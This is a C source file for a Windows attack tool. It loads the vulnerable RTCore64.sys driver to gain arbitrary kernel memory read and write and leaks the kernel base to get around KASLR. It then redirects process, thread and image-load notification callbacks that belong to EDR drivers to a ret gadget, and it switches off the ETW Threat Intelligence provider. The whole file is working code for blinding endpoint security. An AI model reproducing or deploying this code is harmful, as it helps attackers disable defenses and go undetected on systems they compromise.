#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>    
#include <wchar.h>  
#include "KernelPatching.h"


HANDLE LoadDriver() {

    SC_HANDLE scmHandle = NULL;
    SC_HANDLE serviceHandle = NULL;
    LPCWSTR driverName = L"RTCore64.sys";
    LPCWSTR driverBinaryPath = L"C:\\Windows\\System32\\drivers\\RTCore64.sys";

    // Establish a connection to the local Service Control Manager
    scmHandle = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scmHandle == NULL) {
        wprintf(L"[-] OpenSCManagerW failed. Error code: %lu\n", GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    // Attempt to create a new service entry for the kernel driver
    serviceHandle = CreateServiceW(
        scmHandle,
        driverName,                 // Internal service name
        driverName,                 // Display name
        SERVICE_ALL_ACCESS,         // Desired access rights
        SERVICE_KERNEL_DRIVER,      // Service type: Kernel Driver
        SERVICE_DEMAND_START,       // Start type: Manual start on demand
        SERVICE_ERROR_NORMAL,       // Error control severity
        driverBinaryPath,           // Absolute path to the .sys file
        NULL,                       // No load ordering group
        NULL,                       // No tag identifier
        NULL,                       // No service dependencies
        NULL,                       // Runs under the LocalSystem context
        NULL                        // No password required
    );

    if (serviceHandle == NULL) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            wprintf(L"[*] Service already exists in SCM database. Opening existing handle...\n");
            serviceHandle = OpenServiceW(scmHandle, driverName, SERVICE_ALL_ACCESS);
        }
        else {
            wprintf(L"[-] CreateServiceW failed. Error code: %lu\n", err);
            CloseServiceHandle(scmHandle);
            return INVALID_HANDLE_VALUE;
        }
    }

    if (serviceHandle == NULL) {
        wprintf(L"[-] OpenServiceW failed. Error code: %lu\n", GetLastError());
        CloseServiceHandle(scmHandle);
        return INVALID_HANDLE_VALUE;
    }

    // Command the SCM to start the driver service (calls DriverEntry)
    if (!StartServiceW(serviceHandle, 0, NULL)) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) {
            wprintf(L"[*] Driver service is already running.\n");
        }
        else {
            wprintf(L"[-] StartServiceW failed. Error code: %lu\n", err);
        }
    }
    else {
        wprintf(L"[+] Driver successfully loaded and started.\n");
    }

    // Clean up open service handles
    CloseServiceHandle(serviceHandle);
    CloseServiceHandle(scmHandle);

	HANDLE DeviceDriver = CreateFileW(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (DeviceDriver == INVALID_HANDLE_VALUE) {
		printf("Failed to load driver %d", GetLastError());
		return INVALID_HANDLE_VALUE;
	}
	return DeviceDriver;
}

// 4-byte kernel read
BOOL KernelRead32(ULONG64 TargetAddr, PULONG Output, HANDLE DeviceDriver) {
    RTCORE_RW_REQ req = { 0 };
    req.Address = TargetAddr;
    req.Offset = 0;
    req.Size = 4;
    DWORD ret = 0;
    if (!DeviceIoControl(DeviceDriver, IOCTL_RTCORE_READ_DATA, &req, sizeof(req), &req, sizeof(req), &ret, NULL))
        return FALSE;
    *Output = req.Value;
    return TRUE;
}

// 4-byte kernel write
BOOL KernelWrite32(ULONG64 TargetAddr, ULONG val, HANDLE DeviceDriver) {
    RTCORE_RW_REQ req = { 0 };
    req.Address = TargetAddr;
    req.Offset = 0;
    req.Size = 4;
    req.Value = val;
    DWORD ret = 0;
    return DeviceIoControl(DeviceDriver, IOCTL_RTCORE_WRITE_DATA, &req, sizeof(req), &req, sizeof(req), &ret, NULL);
}

// 8-byte helpers
BOOL KernelRead64(ULONG64 TargetAddr,PULONG64 Output, HANDLE DeviceDriver) {
    ULONG LowBytes = 0, HighBytes = 0; 
    if (!KernelRead32(TargetAddr, &LowBytes, DeviceDriver) || !KernelRead32(TargetAddr + 4, &HighBytes, DeviceDriver))
        return FALSE;
    *Output = ((ULONG64)HighBytes << 32) | LowBytes;
    return TRUE;
}

BOOL KernelWrite64(ULONG64 TargetAddr, ULONG64 val, HANDLE DeviceDriver) {
    ULONG LowBytes = 0, HighBytes = 0;
    LowBytes = (ULONG)val;
    HighBytes = (ULONG)(val >> 32);
    if (!KernelWrite32(TargetAddr, LowBytes, DeviceDriver)) return FALSE;
    if (!KernelWrite32(TargetAddr + 4, HighBytes, DeviceDriver)) return FALSE;
    return TRUE;
}

// MSR read 
BOOL KernelReadMSR(ULONG idx, PULONG64 Output, HANDLE DeviceDriver) {
    RTCORE_MSR_REQ req = { .Register = idx };
    DWORD ret = 0;
    if (!DeviceIoControl(DeviceDriver, IOCTL_RTCORE_READ_MSR, &req, sizeof(req), &req, sizeof(req), &ret, NULL))
        return FALSE;
    *Output = ((ULONG64)req.High << 32) | req.Low;
    return TRUE;
}

// KASLR leak
ULONG64 LeakNtBase(HANDLE DeviceDriver) {
    ULONG64 lstar = 0; 
    if (!KernelReadMSR(IA32_LSTAR_MSR, &lstar, DeviceDriver)) return 0;
    return lstar - DELTA_KiSystemCall64;
}

static inline BOOL IsKernelPtr(ULONG64 addr) {
    return addr >= 0xFFFF800000000000ULL;
}

// Find to which module the function belongs (to identeify EDR functions)
BOOL FindFunctionModule(ULONG64 Ntbase, ULONG64 FnAddress, HANDLE DeviceDriver, PWSTR outBuf, SIZE_T outBufChars) {

    ULONG64 LstHead = Ntbase + OFF_PsLoadedModuleList; // Head of the linked list
    ULONG64 CurrEntry = 0, DllBase = 0, DllNameBuf = 0;
    ULONG DllImageSize = 0, DllNameLen32 = 0;
    if (!KernelRead64(LstHead, &CurrEntry, DeviceDriver)) return FALSE;
    for (int i = 0; i < 1024; i++) { // bounded — corrupt list would infinite loop

        if (!IsKernelPtr(CurrEntry)) return FALSE;
        if (CurrEntry == LstHead) return FALSE; // back to the begining

        ULONG64 NextEntry = 0;
        if (!KernelRead64(CurrEntry + OFF_LIST_Flink, &NextEntry, DeviceDriver))
            return FALSE;

        // extracting module data
        if (KernelRead64(CurrEntry + OFF_KLDR_DllBase, &DllBase, DeviceDriver) &&
            KernelRead32(CurrEntry + OFF_KLDR_SizeOfImage, &DllImageSize, DeviceDriver) &&
            KernelRead32(CurrEntry + OFF_KLDR_BaseDllName, &DllNameLen32, DeviceDriver) &&  // UNICODE_STRING.Length
            KernelRead64(CurrEntry + OFF_KLDR_BaseDllName + 0x08, &DllNameBuf, DeviceDriver) && // UNICODE_STRING.BUFFER
            IsKernelPtr(DllBase) && IsKernelPtr(DllNameBuf))
        {

            USHORT DllNameLen = (USHORT)(DllNameLen32 & 0xFFFF); // only the 2 bytes length
            // if the function address is inside the Dll memory
            if (FnAddress >= DllBase && FnAddress < DllBase + DllImageSize && IsKernelPtr(DllBase)) {

                // Reading the name to a local buffer (cant just return a kernel address to user mode)
                USHORT charCount = (USHORT)(DllNameLen / 2);       // DllNameLen is BYTES
                if (charCount >= outBufChars) {
                    charCount = (USHORT)(outBufChars - 1);
                }
                for (USHORT k = 0; k < charCount; k++) {
                    ULONG w32 = 0;
                    KernelRead32((ULONG64)DllNameBuf + (ULONG64)k * 2, &w32, DeviceDriver);
                    outBuf[k] = (WCHAR)(w32 & 0xFFFF);
                }
                outBuf[charCount] = 0;
                return TRUE;
            }
        }

        CurrEntry = NextEntry;

    }
    return FALSE;
}

BOOL IsInEdrList(PWSTR ModuleName) {
    // Check if a module name is an known EDR name (not case sensitive) 
    for (int i = 0; EDR_DRIVERS[i] != NULL; i++) {
        if (_wcsicmp(EDR_DRIVERS[i], ModuleName) == 0) return TRUE;
    }
    return FALSE;
}


BOOL RedirectCallbackArrays(ULONG64 NtBase, HANDLE DeviceDriver) {

    ULONG64 CallbackArraysOff[] = { OFF_PspCreateProcessNotifyRoutine , OFF_PspCreateThreadNotifyRoutine, OFF_PspLoadImageNotifyRoutine };
    ULONG64 RetGadgetAddr = NtBase + OFF_RET_GADGET, FunctionAddr = 0, RawBlock = 0;
    WCHAR FunctionModule[64] = { 0 };

    // enumerate all the 3 callback arrays
    for (int arr = 0; arr < 3; arr++) {
        ULONG64 BaseArrAddr = NtBase + CallbackArraysOff[arr];
        // enumerate all the 64 callback slots in each array
        for (int slot = 0; slot < 64; slot++) {

            // Getting the _EX_CALLBACK_ROUTINE_BLOCK block
            if (!KernelRead64(BaseArrAddr + slot * 8, &RawBlock, DeviceDriver)) continue;// The array is 64 pointers of 8 bytes each
            if (RawBlock == 0) continue; // empty block

            ULONG64 CallbackBlock = RawBlock & ~0xF; // strip flags
            if (!KernelRead64(CallbackBlock + OFF_EXCB_Function, &FunctionAddr, DeviceDriver)) continue;
            if (FunctionAddr == 0) continue; // unregistered function

            if (!FindFunctionModule(NtBase, FunctionAddr, DeviceDriver, FunctionModule, 64)) { // Couldnt determine the module 
                printf("[.] slot[%d] UNRESOLVED fn=0x%llx\n", slot, (unsigned long long)FunctionAddr);
                continue;
            } 

            // If callback belongs to an EDR, change the function address to a ret gadget (redirect)
            if (IsInEdrList(FunctionModule)) {
                printf("[*] slot[%d] EDR MATCH: %ls  fn=0x%llx\n", slot, FunctionModule, (unsigned long long)FunctionAddr);
                // High dword gate for single 4 byte write
                if ((FunctionAddr & 0xFFFFFFFF00000000ULL) != (RetGadgetAddr & 0xFFFFFFFF00000000ULL)) {
                    continue;   // can't do single write safely, skip
                }
                if (!KernelWrite32(CallbackBlock + OFF_EXCB_Function,
                    (ULONG)(RetGadgetAddr & 0xFFFFFFFF), DeviceDriver)) {
                    continue;
                }

                ULONG64 after = 0;
                if (!KernelRead64(CallbackBlock + OFF_EXCB_Function, &after, DeviceDriver)) continue;
                if (after != RetGadgetAddr) {
                    printf("[-] Read-back mismatch: expected 0x%llx got 0x%llx\n", RetGadgetAddr, after);
                    continue;
                }
            }
            else {
                printf("[.] slot[%d] %ls\n", slot, FunctionModule);
            }
        }
    }
    return TRUE;

}

BOOL EtwTiNulling(HANDLE DeviceDriver, ULONG64 NtBase) {

    ULONG64 EtwTiAddress = NtBase + OFF_EtwThreatIntProvRegHandle;
    ULONG64 EtwRegEntry = 0, GUIDEntry = 0, GUIDValue = 0;
    // Get the _ETW_REG_ENTRY Struct address
    if (!KernelRead64(EtwTiAddress, &EtwRegEntry, DeviceDriver) || !IsKernelPtr(EtwRegEntry)) return FALSE;

    // Check if the entry belongs to Windows Threat Intelligence 
    if (!KernelRead64(EtwRegEntry + OFF_ETW_GuidEntry, &GUIDEntry, DeviceDriver) || !IsKernelPtr(GUIDEntry)) return FALSE; // Getting the GUID Struct
    if (!KernelRead32(GUIDEntry + OFF_GUIDENTRY_Guid, &GUIDValue, DeviceDriver) || GUIDValue != ETWIT_GUID) return FALSE; // Getting the GUID value 

    ULONG EnableMask = -1;
    if (!KernelRead32(EtwRegEntry + OFF_ETW_EnableMask, &EnableMask, DeviceDriver)) return FALSE;
    if (EnableMask == 0) return TRUE; // ETW already suppressed (skip)

    // zeroes EnableMask, GroupEnableMask, HostEnableMask, HostGroupEnableMask
    if (!KernelWrite32(EtwRegEntry + OFF_ETW_EnableMask, 0, DeviceDriver)) return FALSE;

    // Check if overwrite was sucsessful
    ULONG After = -1;
    if (!KernelRead32(EtwRegEntry + OFF_ETW_EnableMask, &After, DeviceDriver)) return FALSE;
    if (After != 0) return FALSE;

    return TRUE;

}
